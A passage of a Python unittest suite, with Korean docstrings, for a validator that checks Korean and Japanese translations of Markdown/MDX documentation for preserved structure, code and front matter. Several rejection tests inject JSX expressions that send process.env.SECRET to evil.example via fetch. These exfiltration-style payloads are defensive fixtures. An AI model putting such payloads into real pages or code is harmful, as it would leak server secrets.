            f"{first_source}\n\nSecond sentence.\n"
        )
        translated = (
            f"```text\n{code_payload}\n```\n\n"
            f"{annotated_tail}\n두 번째 문장입니다.\n"
        )

        self.assertEqual(response_contract.verify(translated, source), [])

    def test_rejects_paragraph_changed_to_a_list(self):
        """문단을 목록으로 바꾼 응답 거부."""

        source = "Acquire the cache lock.\n"
        translated = """<!-- Acquire the cache lock. -->
- 캐시 잠금을 획득합니다.
"""

        self.assertIn(
            "provider block signature mismatch",
            response_contract.verify(translated, source),
        )

    def test_accepts_list_quote_table_and_code_structure(self):
        """목록·인용·표·code 구조를 보존한 번역을 허용."""

        source = """- First item.
- Second item.

> Quoted guidance.

| Name | Value |
| --- | --- |
| Cache | Lock |

```php
Cache::lock('foo');
```
"""
        translated = """<!-- - First item. - Second item. -->
- 첫 번째 항목입니다.
- 두 번째 항목입니다.

> 인용 안내입니다.

<!-- | Name | Value | | --- | --- | | Cache | Lock | -->
| 이름 | 값 |
| --- | --- |
| Cache | 잠금 |

```php
Cache::lock('foo');
```
"""

        self.assertEqual(response_contract.verify(translated, source), [])

    def test_rejects_provider_fenced_code_content_changes(self):
        """provider가 변경한 fenced code 내용 거부."""

        source = """Run the command.

```php
Cache::lock('foo');
```
"""
        translated = """<!-- Run the command. -->
명령을 실행합니다.

```php
Cache::forget('foo');
```
"""

        self.assertIn(
            "provider code block mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_accepts_unchanged_toc_link_list_without_annotations(self):
        """annotation 없이 원문을 보존한 목차 link 목록을 허용."""

        source = """- [Cache Locks](#cache-locks)
- [Managing Locks](#managing-locks)
"""

        self.assertEqual(response_contract.verify(source, source), [])

    def test_rejects_changed_nested_list_indentation(self):
        """중첩 목록 들여쓰기 변경 거부."""

        source = """- Parent item.
  - Child item.
"""
        translated = """<!-- - Parent item. - Child item. -->
- 상위 항목입니다.
- 하위 항목입니다.
"""

        self.assertEqual(
            response_contract.verify(translated, source),
            [
                "provider block signature mismatch",
                "provider markdown structure mismatch",
            ],
        )

    def test_rejects_changed_nested_quote_depth(self):
        """중첩 인용 깊이 변경 거부."""

        source = "> Outer quote.\n> > Inner quote.\n"
        translated = """<!-- Outer quote. -->
> 바깥 인용입니다.
<!-- Inner quote. -->
> 안쪽 인용입니다.
"""

        issues = response_contract.verify(translated, source)

        self.assertIn("provider markdown structure mismatch", issues)
        self.assertIn("provider annotation ownership mismatch", issues)

    def test_rejects_changed_navigation_attribute(self):
        """HTML navigation 속성 변경 거부."""

        source = '<TabItem value="composer" label="Composer">\n'
        translated = '<TabItem value="composer" label="コンポーザー">\n'

        self.assertIn(
            "provider HTML markup mismatch",
            response_contract.verify(translated, source),
        )

    def test_accepts_translated_display_attribute(self):
        """HTML display 속성의 문자열 번역을 허용."""

        source = '<img src="cache.png" alt="Cache lock diagram"/>\n'
        translated = '<img src="cache.png" alt="キャッシュロックの図"/>\n'

        self.assertEqual(response_contract.verify(translated, source), [])

    def test_accepts_translated_jsx_brace_display_attribute(self):
        """JSX 중괄호 display 속성의 문자열 번역을 허용."""

        source = '<Widget aria-label={"Cache lock"} />\n'
        translated = """<!-- <Widget aria-label={"Cache lock"} /> -->
<Widget aria-label={"キャッシュロック"} />
"""

        self.assertEqual(response_contract.verify(translated, source), [])

    def test_rejects_dynamic_jsx_display_attribute_change(self):
        """동적 JSX 표시 속성의 식 변경 거부."""

        source = '<Widget aria-label={label} />\n'
        translated = """<!-- <Widget aria-label={label} /> -->
<Widget aria-label={process.env.SECRET} />
"""

        self.assertIn(
            "provider HTML markup mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_expression_hidden_between_display_strings(self):
        """표시 문자열 사이에 숨겨진 식 변경 거부."""

        source = (
            '<img src="/a.png" '
            'alt={"Cache " + labels.safe + " status"} />\n'
        )
        translated = (
            '<img src="/a.png" '
            'alt={"キャッシュ " + process.env.SECRET + " 状態"} />\n'
        )

        self.assertIn(
            "provider HTML markup mismatch",
            response_contract.verify(translated, source, locale="ja"),
        )

    def test_accepts_translated_display_strings_around_same_expression(self):
        """동일한 식 주위의 표시 문자열 번역 허용."""

        source = (
            '<img src="/a.png" '
            'alt={"Cache " + labels.safe + " status"} />\n'
        )
        translated = (
            '<img src="/a.png" '
            'alt={"キャッシュ " + labels.safe + " 状態"} />\n'
        )

        self.assertNotIn(
            "provider HTML markup mismatch",
            response_contract.verify(translated, source, locale="ja"),
        )

    def test_rejects_changed_string_argument_inside_display_expression(self):
        """표시 식 내부 함수의 문자열 인자 변경 거부."""

        source = (
            '<img src="/a.png" '
            'alt={getLabel("safe") + " status"} />\n'
        )
        translated = (
            '<img src="/a.png" '
            'alt={getLabel("secret") + " 状態"} />\n'
        )

        self.assertIn(
            "provider HTML markup mismatch",
            response_contract.verify(translated, source, locale="ja"),
        )

    def test_rejects_changed_display_expression_containing_regex_literal(self):
        """정규식 literal을 포함한 표시 식 변경 거부."""

        source = (
            '<img src="/a.png" '
            'alt={/[\\\'>]/.test(label) ? "safe" : "other"} />\n'
        )
        translated = (
            '<img src="/a.png" '
            'alt={/[\\\'>]/.test((fetch("https://evil.example/" '
            '+ process.env.SECRET), label)) ? "安全" : "その他"} />\n'
        )

        self.assertIn(
            "provider HTML markup mismatch",
            response_contract.verify(translated, source, locale="ja"),
        )

    def test_rejects_display_expression_hidden_between_js_comments(self):
        """JavaScript 주석 사이에 숨겨진 표시 식 변경 거부."""

        source = (
            '<img src="/a.png" alt={label /* + " */ '
            '+ (void 0) + /* " + */ + " visible"} />\n'
        )
        translated = (
            '<img src="/a.png" alt={label /* + " */ '
            '+ (globalThis.pwned = process.env.SECRET) '
            '+ /* " + */ + " 表示"} />\n'
        )

        self.assertIn(
            "provider HTML markup mismatch",
            response_contract.verify(translated, source, locale="ja"),
        )

    def test_rejects_changed_quote_text_inside_display_regex_literal(self):
        """표시 식의 정규식 안 따옴표 문자 변경 거부."""

        source = '<img src="/a.png" alt={/a+\'SAFE\'+b/.source} />\n'
        translated = '<img src="/a.png" alt={/a+\'EVIL\'+b/.source} />\n'

        self.assertIn(
            "provider HTML markup mismatch",
            response_contract.verify(translated, source, locale="ja"),
        )

    def test_rejects_changed_expression_after_control_statement_regex(self):
        """제어문 다음 정규식 뒤의 식 변경 거부."""

        source = (
            '<Widget value={() => { if (x) /\\}\\}>/.test(safe); '
            'return safe; }} keep="yes" />\n'
        )
        translated = (
            '<Widget value={() => { if (x) /\\}\\}>/.test('
            '(fetch(process.env.SECRET), safe)); return evil; }} '
            'keep="no" />\n'
        )

        self.assertIn(
            "provider HTML markup mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_changed_display_expression_after_js_block_comment(self):
        """JavaScript 블록 주석 다음 표시 식 변경 거부."""

        source = (
            '<Widget aria-label={label /* } > */ '
            '+ "English text"} />\n'
        )
        translated = (
            '<Widget aria-label={label /* } > */ '
            '+ (fetch("https://evil.example/" + process.env.SECRET), '
            '"日本語の説明文")} />\n'
        )

        self.assertIn(
            "provider HTML markup mismatch",
            response_contract.verify(translated, source, locale="ja"),
        )

    def test_rejects_changed_display_expression_in_nested_template(self):
        """중첩 template literal 내부 표시 식 변경 거부."""

        source = (
            '<Widget aria-label={`outer ${`inner } > English text '
            '${label}`}`} />\n'
        )
        translated = (
            '<Widget aria-label={`outer ${`inner } > 日本語の説明文 '
            '${(fetch("https://evil.example/" + process.env.SECRET), '
            'label)}`}`} />\n'
        )

        self.assertIn(
            "provider HTML markup mismatch",
            response_contract.verify(translated, source, locale="ja"),
        )

    def test_rejects_non_display_attribute_containing_display_attribute_text(self):
        """표시 속성명 문자열을 포함한 비표시 속성 변경 거부."""

        source = '<Widget title="Example aria-label=\'Original\' text" />\n'
        translated = """<!-- <Widget title="Example aria-label='Original' text" /> -->
<Widget title="Example aria-label='Changed' text" />
"""

        self.assertIn(
            "provider HTML markup mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_attribute_after_jsx_template_literal_comparison(self):
        """JSX template literal 비교식 다음 속성 변경 거부."""

        source = '<Widget value={`} >`} title="keep" />\n'
        translated = """<!-- <Widget value={`} >`} title="keep" /> -->
<Widget value={`} >`} title="changed" />
"""

        self.assertIn(
            "provider HTML markup mismatch",
            response_contract.verify(translated, source),
        )

    def test_accepts_autolink_moved_inside_translated_paragraph(self):
        """번역 문단 안에서 위치가 바뀐 보존 autolink를 허용."""

        source = "<https://laravel.com> provides official documentation.\n"
        translated = """<!-- <https://laravel.com> provides official documentation. -->
공식 문서는 <https://laravel.com>에서 제공합니다.
"""

        self.assertEqual(response_contract.verify(translated, source), [])

    def test_rejects_dropped_source_html_comment(self):
        """누락된 원문 작성 HTML 주석 거부."""

        source = """<!-- keep: generated reference -->

Acquire the cache lock.
"""
        translated = """<!-- Acquire the cache lock. -->
캐시 잠금을 획득합니다.
"""

        self.assertIn(
            "provider source comment mismatch",
            response_contract.verify(translated, source),
        )

    def test_accepts_preserved_inline_source_html_comment(self):
        """본문 안의 원문 작성 HTML 주석 보존 허용."""

        source = "Before <!-- keep --> after.\n"
        translated = """<!-- Before <!-- keep --&gt; after. -->
이전 <!-- keep --> 이후입니다.
"""

        self.assertEqual(response_contract.verify(translated, source), [])

    def test_rejects_relocated_source_html_comment(self):
        """구조 위치가 바뀐 원문 작성 HTML 주석 거부."""

        source = """<!-- keep -->

Paragraph to translate here.
"""
        translated = """<!-- Paragraph to translate here. -->
번역할 문단입니다.

<!-- keep -->
"""

        self.assertIn(
            "provider source comment mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_extra_structural_source_comment(self):
        """원문에 없는 구조 HTML 주석 추가 거부."""

        source = "Hello world.\n"
        comments = (
            "<!-- > hidden -->",
            "<!-- | hidden | -->",
            '<!-- <a name="evil"></a> -->',
            "<!--\n<p>\n<img src=\"evil.png\"/>\n</p>\n-->",
        )
        for comment in comments:
            with self.subTest(comment=comment):
                translated = f"""{comment}
<!-- Hello world. -->
안녕하세요.
"""

                self.assertIn(
                    "provider source comment mismatch",
                    response_contract.verify(translated, source, locale="ko"),
                )

    def test_rejects_changed_jsx_attribute_after_expression_comparison(self):
        """식 비교 다음 JSX 속성 변경 거부."""

        source = '<Widget visible={count > 0} value="keep" />\n'
        translated = """<!-- <Widget visible={count > 0} value="keep" /> -->
<Widget visible={count > 0} value="changed" />
"""

        self.assertIn(
            "provider HTML markup mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_nested_quote_removed_from_list(self):
        """목록 안의 중첩 인용 블록 제거 거부."""

        source = """- Parent item.
  > Nested quote guidance.
"""
        translated = """<!-- - Parent item. -->
- 상위 항목입니다.
  <!-- Nested quote guidance. -->
  중첩 인용 안내입니다.
"""

        self.assertIn(
            "provider markdown structure mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_extra_unmarked_list_continuation(self):
        """목록에 추가된 표식 없는 연속 줄 거부."""

        source = "- Item to translate.\n"
        translated = """<!-- - Item to translate. -->
- 번역할 항목입니다.
  원문에 없는 추가 설명입니다.
"""

        self.assertEqual(
            response_contract.verify(translated, source),
            ["provider paragraph layout mismatch"],
        )

    def test_accepts_preserved_unmarked_list_continuation(self):
        """원문과 같은 개수의 표식 없는 목록 연속 줄을 허용."""

        source = """- Parent item.
  Continued source guidance.
"""
        translated = """<!-- - Parent item. Continued source guidance. -->
- 상위 항목입니다.
  이어지는 안내입니다.
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_rejects_changed_admonition_type(self):
        """GFM admonition 유형 변경 거부."""

        source = "> [!NOTE]\n> Cache lock guidance.\n"
        translated = """> [!WARNING]
> <!-- Cache lock guidance. -->
> 캐시 잠금 안내입니다.
"""

        self.assertIn(
            "provider markdown structure mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_localized_legacy_admonition_type_downgrade(self):
        """현지화된 기존 admonition 유형의 수준 하향 거부."""

        source = "> **Caution:**\n> Important safety guidance.\n"
        translated = "> **注意:**\n> 重要な安全上の案内です。\n"

        self.assertIn(
            "provider admonition type mismatch",
            response_contract.verify(translated, source, locale="ja"),
        )

    def test_accepts_same_provider_admonition_type_from_inline_source_marker(self):
        """inline 원문 표식과 같은 provider admonition 유형을 허용."""

        source = "> [!NOTE] Cache lock guidance.\n"
        translated = """> [!NOTE]
> <!-- Cache lock guidance. -->
> 캐시 잠금 안내입니다.
"""

        self.assertNotIn(
            "provider admonition type mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_rejects_changed_provider_admonition_type_in_markdown_containers(self):
        """Markdown 컨테이너 안 provider admonition 유형 변경 거부."""

        cases = (
            (
                "- > [!WARNING] Protect credentials.\n",
                "- > [!NOTE] 자격 증명을 보호합니다.\n",
            ),
            (
                "1. > [!WARNING] Protect credentials.\n",
                "1. > [!NOTE] 자격 증명을 보호합니다.\n",
            ),
            (
                ">> [!WARNING] Protect credentials.\n",
                ">> [!NOTE] 자격 증명을 보호합니다.\n",
            ),
            (
                "> [!WARNING]Protect credentials.\n",
                "> [!NOTE]자격 증명을 보호합니다.\n",
            ),
            (
                "> [!WARNING]\n> Protect credentials.\n",
                "> [!warning]\n> 자격 증명을 보호합니다.\n",
            ),
        )

        for source, translated in cases:
            with self.subTest(source=source):
                self.assertIn(
                    "provider admonition type mismatch",
                    response_contract.verify(
                        translated,
                        source,
                        locale="ko",
                    ),
                )

    def test_ignores_admonition_markers_in_protected_regions(self):
        """fenced code와 HTML 주석 안의 admonition 표식을 제외."""

        cases = (
            (
                "```md\n> [!WARNING]\n```\n",
                "```md\n> [!NOTE]\n```\n",
            ),
            (
                "<!--\n> [!WARNING]\n-->\n",
                "<!--\n> [!NOTE]\n-->\n",
            ),
        )

        for source, translated in cases:
            with self.subTest(source=source):
                self.assertNotIn(
                    "provider admonition type mismatch",
                    response_contract.verify(translated, source),
                )

    def test_rejects_changed_table_separator_alignment(self):
        """표 separator 정렬 변경 거부."""

        source = """| Left | Right |
| :--- | ---: |
| Cache | Lock |
"""
        translated = """| 왼쪽 | 오른쪽 |
| ---: | :--- |
| 캐시 | 잠금 |
"""

        self.assertIn(
            "provider markdown structure mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_table_separator_with_fewer_than_three_hyphens(self):
        """하이픈이 세 개 미만인 표 separator 거부."""

        source = (
            "| Name | Value |\n"
            "| --- | --- |\n"
            "| Widget | enabled |\n"
        )
        translated = (
            "<!-- | Name | Value | | --- | --- | | Widget | enabled | -->\n"
            "| 이름 | 값 |\n"
            "| -- | - |\n"
            "| Widget | 활성 |\n"
        )

        self.assertIn(
            "provider markdown structure mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_rejects_duplicate_translated_table_row(self):
        """번역 표 행 중복 거부."""

        source = """| Name | Value |
| --- | --- |
| Cache | Stores values |
"""
        translated = """| 이름 | 값 |
| --- | --- |
| 이름 | 값 |
"""

        self.assertIn(
            "provider duplicate table row",
            response_contract.verify(translated, source),
        )

    def test_allows_removed_emphasis_delimiters(self):
        """어휘로 흡수된 강조 구분자 누락 허용."""

        source = "Use **atomic locks** before updating the value.\n"
        translated = """<!-- Use **atomic locks** before updating the value. -->
값을 업데이트하기 전에 atomic locks를 사용합니다.
"""

        self.assertNotIn(
            "provider inline markup mismatch",
            response_contract.verify(translated, source),
        )

    def test_allows_removed_single_emphasis_around_a_link(self):
        """링크를 감싼 단일 강조 구분자 누락 허용."""

        source = (
            "Read *the [atomic lock guide](https://example.com/locks)* now.\n"
        )
        translated = (
            "<!-- Read *the [atomic lock guide](https://example.com/locks)* now. -->\n"
            "[atomic lock guide](https://example.com/locks)를 읽으세요.\n"
        )

        self.assertNotIn(
            "provider inline markup mismatch",
            response_contract.verify(translated, source),
        )

    def test_allows_removed_underscore_emphasis(self):
        """밑줄 강조 구분자 누락 허용."""

        source = "Use _atomic locks_ before updating the value.\n"
        translated = """<!-- Use _atomic locks_ before updating the value. -->
값을 업데이트하기 전에 atomic locks를 사용합니다.
"""

        self.assertNotIn(
            "provider inline markup mismatch",
            response_contract.verify(translated, source),
        )

    def test_list_asterisk_is_not_treated_as_emphasis(self):
        """목록 별표를 강조 구분자로 오인하지 않음."""

        source = "* Use atomic locks here.\n"
        translated = """<!-- * Use atomic locks here. -->
* 여기서 atomic locks를 사용합니다.
"""

        self.assertNotIn(
            "provider inline markup mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_changed_task_checkbox_state(self):
        """task 목록 checkbox 상태 변경 거부."""

        source = "- [ ] Pending task.\n- [x] Completed task.\n"
        translated = """<!-- - [ ] Pending task. - [x] Completed task. -->
- [x] 대기 중인 작업입니다.
- [ ] 완료된 작업입니다.
"""

        self.assertIn(
            "provider markdown structure mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_removed_blockquote_hard_break(self):
        """인용문 hard break 제거 거부."""

        source = "> First source line.  \n> Second source line.\n"
        translated = (
            "> <!-- First source line. Second source line. -->\n"
            "> 첫 번째 줄입니다.\n"
            "> 두 번째 줄입니다.\n"
        )

        self.assertIn(
            "provider markdown structure mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_extra_line_inside_translated_paragraph(self):
        """hard break 없는 번역 문단의 추가 물리 줄 거부."""

        source = "First paragraph has enough words.\n"
        translated = """<!-- First paragraph has enough words. -->
첫 번째 문단입니다.
원문에 없는 추가 설명입니다.
"""

        self.assertIn(
            "provider paragraph layout mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_paragraph_indented_as_a_markdown_code_block(self):
        """문단을 들여쓰기 Markdown code로 바꾼 응답 거부."""

        source = "Acquire the cache lock.\n"
        translated = """<!-- Acquire the cache lock. -->
    캐시 잠금을 획득합니다.
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            ["provider paragraph indentation mismatch"],
        )

    def test_rejects_extra_line_inside_inline_html_paragraph(self):
        """inline HTML 문단의 추가 물리 줄 거부."""

        source = "<em>Cache</em> is useful here.\n"
        translated = """<!-- <em>Cache</em> is useful here. -->
<em>Cache</em>는 유용합니다.
원문에 없는 추가 줄입니다.
"""

        self.assertIn(
            "provider paragraph layout mismatch",
            response_contract.verify(translated, source),
        )

    def test_accepts_line_preserving_raw_html_table_translation(self):
        """물리 줄 구조를 보존한 raw HTML 표 번역을 허용."""

        source = """<table>
<tr><td><strong>Command</strong></td><td><code>php</code></td></tr>
<tr><td><strong>Args</strong></td><td><code>artisan boost:mcp</code></td></tr>
</table>
"""
        translated = """<table>
<!-- <tr><td><strong>Command</strong></td><td><code>php</code></td></tr> <tr><td><strong>Args</strong></td><td><code>artisan boost:mcp</code></td></tr> -->
<tr><td><strong>명령어</strong></td><td><code>php</code></td></tr>
<tr><td><strong>인수</strong></td><td><code>artisan boost:mcp</code></td></tr>
</table>
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_rejects_changed_raw_html_code_contents(self):
        """raw HTML code 요소의 내용 변경 거부."""

        source = """<table>
<tr><td><strong>Command</strong></td><td><code>php</code></td></tr>
<tr><td><strong>Args</strong></td><td><code>artisan boost:mcp</code></td></tr>
</table>
"""
        translated = """<table>
<!-- <tr><td><strong>Command</strong></td><td><code>php</code></td></tr> <tr><td><strong>Args</strong></td><td><code>artisan boost:mcp</code></td></tr> -->
<tr><td><strong>コマンド</strong></td><td><code>破損コード</code></td></tr>
<tr><td><strong>引数</strong></td><td><code>別の破損</code></td></tr>
</table>
"""

        self.assertIn(
            "provider HTML code mismatch",
            response_contract.verify(translated, source, locale="ja"),
        )

    def test_accepts_collapsed_soft_wrapped_source_paragraph(self):
        """soft wrap 원문 문단을 한 줄로 축약한 번역을 허용."""

        source = "First source line.\nSecond source line.\n"
        translated = """<!-- First source line. Second source line. -->
첫 번째와 두 번째 원문 줄을 번역한 문단입니다.
"""

        self.assertEqual(response_contract.verify(translated, source), [])

    def test_accepts_preserved_explicit_markdown_hard_break(self):
        """명시적 Markdown hard break 보존을 허용."""

        source = "First source line.  \nSecond source line.\n"
        translated = (
            "<!-- First source line. Second source line. -->\n"
            "첫 번째 줄입니다.  \n"
            "두 번째 줄입니다.\n"
        )

        self.assertEqual(response_contract.verify(translated, source), [])

    def test_rejects_changed_nontranslatable_front_matter(self):
        """번역 불가 머리말 값 변경 거부."""

        source = """---
slug: cache
sidebar_position: 1
description: Cache guide.
---

Acquire the cache lock.
"""
        translated = """---
slug: キャッシュ
sidebar_position: 2
description: キャッシュガイドです。
---

<!-- Acquire the cache lock. -->
キャッシュロックを取得します。
"""

        self.assertIn(
            "provider front matter mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_changed_source_owned_block_scalar_bytes(self):
        """원문 소유 block scalar byte 변경 거부."""

        source = "---\ntitle: |\n  Cache\n---\n"
        translated = "---\ntitle: |\n  Cache  \n---\n"

        self.assertIn(
            "provider front matter mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_deleted_front_matter_description_value(self):
        """머리말 description 값 삭제 거부."""

        source = """---
slug: cache
description: Cache guide.
---

Acquire the cache lock.
"""
        translated = """---
slug: cache
description:
---

<!-- Acquire the cache lock. -->
캐시 잠금을 획득합니다.
"""

        self.assertIn(
            "provider front matter mismatch",
            response_contract.verify(translated, source),
        )

    def test_excludes_front_matter_description_from_language_check(self):
        """언어 판정에서 inline 머리말 description 제외."""

        source = """---
slug: cache
description: Guide to caching with atomic locks.
---

Acquire the cache lock.
"""
        translated = """---
slug: cache
description: Guide to caching with atomic locks.
---

<!-- Acquire the cache lock. -->
캐시 잠금을 획득합니다.
"""

        self.assertNotIn(
            "provider target language mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_excludes_block_front_matter_description_from_language_check(self):
        """언어 판정에서 block scalar 머리말 description 제외."""

        source = """---
slug: cache
description: >-
  Guide to caching with
  atomic locks.
---

Acquire the cache lock.
"""
        translated = """---
slug: cache
description: >-
  Guide to caching with
  atomic locks.
---

<!-- Acquire the cache lock. -->
캐시 잠금을 획득합니다.
"""

        self.assertNotIn(
            "provider target language mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_accepts_translated_front_matter_description(self):
        """구조를 보존한 front matter description 번역을 허용."""

        source = """---
slug: cache
description: Guide to caching with atomic locks.
---

Acquire the cache lock.
"""
        translated = """---
slug: cache
description: atomic locks를 사용한 캐싱 안내입니다.
---

<!-- Acquire the cache lock. -->
캐시 잠금을 획득합니다.
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_rejects_non_string_or_malformed_front_matter_description(self):
        """문자열이 아니거나 잘못된 머리말 description 거부."""

        source = """---
slug: cache
description: Cache guide.
---

Acquire the cache lock.
"""
        descriptions = (
            "{ko: 캐시 안내}",
            "[캐시 안내]",
            "캐시: 안내",
            '"캐시 안내',
            '"캐시 안내": ignored',
            "%캐시 안내",
            "]캐시 안내",
            "}캐시 안내",
            "true",
            "null",
            "42",
            "0xFF",
            "0b101",
            ".5",
            "01",
            "0_1",
            "+01",
            "1:20",
            "1_:20",
            "12:34:56.7",
            "2026-07-15T12:30:00Z",
            "1._0",
            "1.0_e0",
            "1_e0",
            "0x_1",
        )

        for description in descriptions:
            with self.subTest(description=description):
                translated = f"""---
slug: cache
description: {description}
---

<!-- Acquire the cache lock. -->
캐시 잠금을 획득합니다.
"""

                self.assertIn(
                    "provider front matter invalid",
                    response_contract.verify(translated, source, locale="ko"),
                )

    def test_accepts_supported_yaml_description_scalars(self):
        """지원되는 YAML description scalar 형식을 허용."""

        cases = (
            (
                'description: "Cache guide." # keep',
                'description: "캐시 안내입니다." # keep',
            ),
            (
                "description: Cache guide. # keep",
                "description: 캐시 안내입니다. # keep",
            ),
            (
                "description: |4- # keep\n    Cache guide.",
                "description: |4- # keep\n    캐시 안내입니다.",
            ),
            ("description: yes", "description: yes 캐시 안내입니다."),
            ("description: no", "description: no 캐시 안내입니다."),
            ("description: on", "description: on 캐시 안내입니다."),
            ("description: off", "description: off 캐시 안내입니다."),
            ("description: 0o17", "description: 0o17 캐시 안내입니다."),
            ("description: 0O17", "description: 0O17 캐시 안내입니다."),
            ("description: 0X10", "description: 0X10 캐시 안내입니다."),
            ("description: 0B11", "description: 0B11 캐시 안내입니다."),
            ("description: -.1", "description: -.1 캐시 안내입니다."),
            ("description: +.1", "description: +.1 캐시 안내입니다."),
            ("description: 2026-7-5", "description: 2026-7-5 캐시 안내입니다."),
            ("description: 1_", "description: 1_"),
            ("description: -9_", "description: -9_"),
            ("description: 1e2_0", "description: 1e2_0"),
            ("description: .1_", "description: .1_"),
            ("description: TrUe", "description: TrUe 캐시 안내입니다."),
            ("description: .nAn", "description: .nAn 캐시 안내입니다."),
        )

        for source_description, translated_description in cases:
            with self.subTest(source_description=source_description):
                source = f"""---
slug: cache
{source_description}
---

Acquire the cache lock.
"""
                translated = f"""---
slug: cache
{translated_description}
---

<!-- Acquire the cache lock. -->
캐시 잠금을 획득합니다.
"""

                self.assertEqual(
                    response_contract.verify(translated, source, locale="ko"),
                    [],
                )

    def test_rejects_changed_yaml_description_comment(self):
        """YAML description에 붙은 주석 변경 거부."""

        source = """---
description: Cache guide. # keep
---

Acquire the cache lock.
"""
        translated = """---
description: 캐시 안내입니다. # changed
---

<!-- Acquire the cache lock. -->
캐시 잠금을 획득합니다.
"""

        self.assertIn(
            "provider front matter mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_rejects_invalid_block_description_indentation(self):
        """block scalar description의 잘못된 들여쓰기 거부."""

        source = """---
description: |
  Cache guide first line.
  Cache guide second line.
---

Acquire the cache lock.
"""
        descriptions = (
            "description: |\n  캐시 안내 첫 줄입니다.\n 캐시 안내 둘째 줄입니다.",
            "description: |\n    \n  캐시 안내입니다.",
        )

        for description in descriptions:
            with self.subTest(description=description):
                translated = f"""---
{description}
---

<!-- Acquire the cache lock. -->
캐시 잠금을 획득합니다.
"""

                self.assertIn(
                    "provider front matter invalid",
                    response_contract.verify(translated, source, locale="ko"),
                )

    def test_live_profile_rejects_license_source_echo(self):
        """live profile에서 긴 license 원문 동일 응답 거부."""

        source = "Permission is hereby granted to use this software.\n"
        translated = """<!-- Permission is hereby granted to use this software. -->
Permission is hereby granted to use this software.
"""

        self.assertIn(
            "provider target language mismatch",
            response_contract.verify(
                translated,
                source,
                locale="ko",
            ),
        )

    def test_license_exception_does_not_allow_nonlegal_source_echo(self):
        """license 예외로 법률 문서가 아닌 산문의 원문 동일 응답을 허용하지 않음."""

        source = "Read this introduction before reviewing the legal terms.\n"
        translated = """<!-- Read this introduction before reviewing the legal terms. -->
Read this introduction before reviewing the legal terms.
"""

        issues = response_contract.verify(
            translated,
            source,
            locale="ko",
        )

        self.assertIn("provider target language mismatch", issues)

    def test_live_profile_has_no_special_license_mismatch_contract(self):
        """live profile에 license 전용 불일치 계약을 두지 않음."""

        source = "Permission is hereby granted to use this software.\n"
        translated = """<!-- Permission is hereby granted to use this software. -->
Permission is hereby granted to modify this software.
"""

        self.assertIn(
            "provider target language mismatch",
            response_contract.verify(
                translated,
                source,
                locale="ko",
            ),
        )

    def test_allows_exact_source_echo_below_twenty_letters(self):
        """원문 Letter가 20자 미만이면 동일 응답을 허용."""

        for source_body in ("Use atomic locks.", "Use locks."):
            with self.subTest(source_body=source_body):
                source = f"{source_body}\n"
                translated = f"<!-- {source_body} -->\n{source_body}\n"

                self.assertNotIn(
                    "provider target language mismatch",
                    response_contract.verify(translated, source, locale="ko"),
                )

    def test_accepts_japanese_translation_below_script_threshold(self):
        """문자 체계 하한 미만의 짧은 일본어 번역을 허용."""

        source = "Use the cache lock.\n"
        translated = """<!-- Use the cache lock. -->
キャッシュロックを使用します。
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ja"),
            [],
        )

    def test_ignores_complete_parenthesized_link_destination_in_language_check(self):
        """언어 판정에서 괄호로 감싼 전체 link target을 제외."""

        suffix = "/" + "very-long-english-reference-segment-" * 8
        target = f"https://en.wikipedia.org/wiki/Mode_(statistics){suffix}"
        source = f"Read the [Mode reference]({target}).\n"
        translated = (
            f"<!-- Read the [Mode reference]({target}). -->\n"
            f"[Mode reference]({target})에서 읽으세요.\n"
        )

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_does_not_apply_japanese_script_minimum_below_forty_letters(self):
        """원문 Letter 40자 미만에는 일본어 문자 최소치 제외."""

        source = "Acquire the cache lock.\n"
        translated = """<!-- Acquire the cache lock. -->
获取缓存锁。
"""

        self.assertNotIn(
            "provider target language mismatch",
            response_contract.verify(translated, source, locale="ja"),
        )

    def test_does_not_infer_product_name_list_as_protected(self):
        """제품명처럼 보이는 목록을 보호 데이터로 추정하지 않음."""

        source = "- Redis\n- Memcached\n- DynamoDB\n"
        translated = """<!-- - Redis - Memcached - DynamoDB -->
- Redis
- Memcached
- DynamoDB
"""

        self.assertIn(
            "provider target language mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_allows_exact_data_cells_below_twenty_letters(self):
        """Letter가 20자 미만인 표 data cell의 원문 동일 응답을 허용."""

        source = """| Feature | Description |
| --- | --- |
| Lock | Prevent writes |
"""
        translated = """| 기능 | 설명 |
| --- | --- |
| Lock | Prevent writes |
"""

        self.assertNotIn(
            "provider target language mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_rejects_table_headers_echoed_from_the_source(self):
        """표 머리글 셀의 원문 동일 응답을 거부."""

        source = """| Feature | Description |
| --- | --- |
| Lock | Prevent writes |
"""

        self.assertIn(
            "provider target language mismatch",
            response_contract.verify(source, source, locale="ko"),
        )

    def test_allows_unchanged_short_table_prose_cell(self):
        """짧아서 그대로 남은 표 산문 cell을 허용."""

        source = """| Feature | Description |
| --- | --- |
| Lock | Prevent writes |
| Cache | Stores values |
"""
